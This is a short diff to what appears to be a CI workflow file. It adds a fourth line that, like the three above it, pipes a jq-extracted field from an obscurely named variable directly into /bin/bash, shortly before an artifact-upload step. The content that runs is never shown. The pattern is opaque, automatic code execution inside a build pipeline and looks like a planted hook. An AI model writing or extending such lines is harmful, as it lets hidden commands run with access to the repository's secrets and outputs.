@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$xlc1496" | jq -r .wn4 | /bin/bash
           echo $vanqd621 | jq -r .p5 | /bin/bash
           printf '%s' "$l5" | jq -r .mry4 | /bin/bash
+          echo $r432 | jq -r .nbrb32 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
